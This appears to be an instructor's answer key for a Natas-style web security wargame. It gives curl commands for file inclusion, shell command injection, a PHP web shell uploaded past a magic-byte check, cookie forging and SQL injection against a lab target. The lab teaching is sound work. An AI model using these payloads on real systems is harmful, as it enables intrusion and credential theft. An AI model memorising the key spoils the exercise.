# Natas — Full Solution Writeups

Complete, step-by-step solutions for Natas level endpoints.
Instructor answer key — not for participant distribution. Results after
Natas 0 are per-team dynamic values; replace each placeholder with the
value recovered by that team.

Every level is reached from inside the shared attacker workstation (open
via supported noVNC; SSH is available only when the platform supplies
credentials — see "Natas: Start Here"), never directly. All 15 level
endpoints share one target box; each level is a different
port (`8000` + level number). Login is HTTP Basic Auth: username
`natasN`, password is the previous level's flag (level 0 uses `natas0`/
`natas0`). Commands below assume a terminal inside the attacker
(`curl` works there; a real browser via noVNC works identically).

---

### Natas 0 → 1: View Source
```
curl -u natas0:natas0 http://<target-host>:8000/
```
The password is directly in an HTML comment in the page source.
**Result:** `<team's Natas 1 password>`

---

### Natas 1 → 2: Right-Click Block
```
curl -u 'natas1:<team-natas-1-password>' http://<target-host>:8001/
```
`curl`/view-source bypasses the JS-only right-click block entirely; the
password is in an HTML comment, same pattern as level 0.
**Result:** `<team's Natas 2 password>`

---

### Natas 2 → 3: Directory Traversal (Files)
```
curl -u 'natas2:<team-natas-2-password>' http://<target-host>:8002/
# note the embedded image path, e.g. files/pixel.png
curl -u 'natas2:<team-natas-2-password>' http://<target-host>:8002/files/
```
Directory listing is enabled; the listing reveals a password file to
fetch directly.
**Result:** `<team's Natas 3 password>`

---

### Natas 3 → 4: Web Crawlers (Robots.txt)
```
curl -u 'natas3:<team-natas-3-password>' http://<target-host>:8003/robots.txt
```
Fetch whichever path it lists as disallowed.
**Result:** `<team's Natas 4 password>`

---

### Natas 4 → 5: Referer Spoofing
```
curl -u 'natas4:<team-natas-4-password>' http://<target-host>:8004/
```
The error message states the exact Referer value expected (in this
deployment: the same host, one port higher than the request arrived on).
```
curl -u 'natas4:<team-natas-4-password>' -e 'http://<target-host>:8005/' http://<target-host>:8004/
```
**Result:** `<team's Natas 5 password>`

---

### Natas 5 → 6: Cookie Manipulation
```
curl -v -u 'natas5:<team-natas-5-password>' http://<target-host>:8005/
```
Note the `Set-Cookie` (e.g. `loggedin=0`).
```
curl -u 'natas5:<team-natas-5-password>' -b 'loggedin=1' http://<target-host>:8005/
```
**Result:** `<team's Natas 6 password>`

---

### Natas 6 → 7: Hidden Inclusion Files
```
curl -u 'natas6:<team-natas-6-password>' http://<target-host>:8006/?source
```
The source shows an `include` from a specific relative path (e.g.
`includes/secret.inc`).
```
curl -u 'natas6:<team-natas-6-password>' http://<target-host>:8006/includes/secret.inc
# submit the revealed secret value via the form (POST secret=<value>)
curl -u 'natas6:<team-natas-6-password>' -d 'secret=<value>' http://<target-host>:8006/
```
**Result:** `<team's Natas 7 password>`

---

### Natas 7 → 8: Local File Inclusion (LFI)
```
curl -u 'natas7:<team-natas-7-password>' "http://<target-host>:8007/index.php?viewsource"
curl -u 'natas7:<team-natas-7-password>' "http://<target-host>:8007/index.php?page=/etc/natas_webpass/natas8"
```
No `../` traversal needed — the `page` parameter is used directly as an
absolute filesystem path with no validation.
**Result:** `<team's Natas 8 password>`

---

### Natas 8 → 9: Reversing Crypto Schemes
```
curl -u 'natas8:<team-natas-8-password>' http://<target-host>:8008/?source
```
Source shows `bin2hex(strrev(base64_encode($secret)))`. Reverse in the
opposite order: hex-decode, then reverse the string, then base64-decode.
```
echo '<the-shown-encoded-secret>' | xxd -r -p | rev | base64 -d
# submit the result as the secret
curl -u 'natas8:<team-natas-8-password>' -d 'secret=<result>' http://<target-host>:8008/
```
**Result:** `<team's Natas 9 password>`

---

### Natas 9 → 10: Command Injection I
```
curl -u 'natas9:<team-natas-9-password>' "http://<target-host>:8009/?needle=;cat+/etc/natas_webpass/natas10"
```
The `needle` parameter is passed straight into a shell `grep` command
with no sanitization.
**Result:** `<team's Natas 10 password>`

---

### Natas 10 → 11: Command Injection II (Sanitization Bypass)
`#` avoids the filtered metacharacters. `grep` itself accepts a
second filename argument on its own command line, with no shell
metacharacter needed at all:
```
curl -u 'natas10:<team-natas-10-password>' "http://<target-host>:8010/?needle=.%20/etc/natas_webpass/natas11%20%23"
```
(`needle` = `. /etc/natas_webpass/natas11 #` — the lone `.` matches every
line of whatever file grep was already going to search; the second word
is a second file for grep to search; the trailing ` #` comments out the
rest of the real shell command line.)
**Result:** `<team's Natas 11 password>`

---

### Natas 11 → 12: XOR Encryption Bypass
```
curl -v -u 'natas11:<team-natas-11-password>' http://<target-host>:8011/
```
Note the default cookie value. Base64-decode it, then XOR it against the
known default plaintext JSON (e.g. `{"showpassword":"no","bgcolor":"#ffffff"}`)
to recover the repeating XOR key. Build a new plaintext with
`showpassword` set to `yes`, XOR-encrypt with the recovered key,
base64-encode, and set as the cookie:
```
curl -u 'natas11:<team-natas-11-password>' -b 'data=<forged-cookie>' http://<target-host>:8011/
```
**Result:** `<team's Natas 12 password>`

---

### Natas 12 → 13: Arbitrary File Upload (Web Shell)
```
echo '<?php system($_GET["c"]); ?>' > shell.php
curl -u 'natas12:<team-natas-12-password>' -F 'filename=shell.php' -F 'uploadedfile=@shell.php' http://<target-host>:8012/
```
Note the uploaded file's path from the response, then:
```
curl -u 'natas12:<team-natas-12-password>' "http://<target-host>:8012/uploads/<uploaded-path>?c=cat+/etc/natas_webpass/natas13"
```
**Result:** `<team's Natas 13 password>`

---

### Natas 13 → 14: File Upload Bypass (Magic Bytes)
Same upload flow, but the server now checks the file's actual bytes via
`exif_imagetype()`. Prepend a real GIF signature ahead of the payload:
```
printf 'GIF89a<?php system($_GET["c"]); ?>' > shell.php
curl -u 'natas13:<team-natas-13-password>' -F 'filename=shell.php' -F 'uploadedfile=@shell.php' http://<target-host>:8013/
curl -u 'natas13:<team-natas-13-password>' "http://<target-host>:8013/uploads/<uploaded-path>?c=cat+/etc/natas_webpass/natas14"
```
(`exif_imagetype()` only reads the first bytes; PHP still executes
everything from `<?php` onward regardless of what precedes it.)
**Result:** `<team's Natas 14 password>`

---

### Natas 14 → 15: SQL Injection (SQLi)
```
curl -u 'natas14:<team-natas-14-password>' http://<target-host>:8014/?source
```
Source shows the query is built with raw double-quote concatenation:
`SELECT * from users where username="<user>" and password="<pass>"`.
```
curl -u 'natas14:<team-natas-14-password>' \
  --data-urlencode 'username=" OR "1"="1" -- ' \
  --data-urlencode 'password=x' \
  http://<target-host>:8014/
```
(Trailing space after `--` matters — it comments out the rest of the
original query. Payload must match the source's actual quote character;
this deployment uses double quotes, not the single-quote style many
generic SQLi examples show.)
**Result (final Natas flag):** `<team's final Natas flag>`

---

### Natas 15 → 16: Boolean Response Oracle
Use the documented constrained predicate grammar and enumerate one credential character at a time, retaining only prefixes that produce the positive response. Keep requests bounded and paced. **Result:** `<team's Natas 16 password>`

### Natas 16 → 17: Denylist Search Emulator
This clean-room lesson has no process execution. Its source documents a strict CEI reference-expansion grammar that the superficial punctuation denylist does not reject. Use the documented reference to resolve the hidden training record; direct catalog terms remain ordinary literal searches. **Result:** `<team's Natas 17 password>`

### Natas 17 → 18: Timing Response Oracle
Submit candidate prefixes repeatedly and compare the deterministic application delay; the body remains identical. **Result:** `<team's Natas 18 password>`

### Natas 18 → 19: Predictable Numeric Sessions
Inspect the numeric session cookie and test only the documented bounded identifier range to reach the local operator record. **Result:** `<team's Natas 19 password>`

### Natas 19 → 20: Encoded Weak Session Token
Decode the URL-safe ticket, preserve its strict record syntax, alter the authorization field, and encode it again. **Result:** `<team's Natas 20 password>`
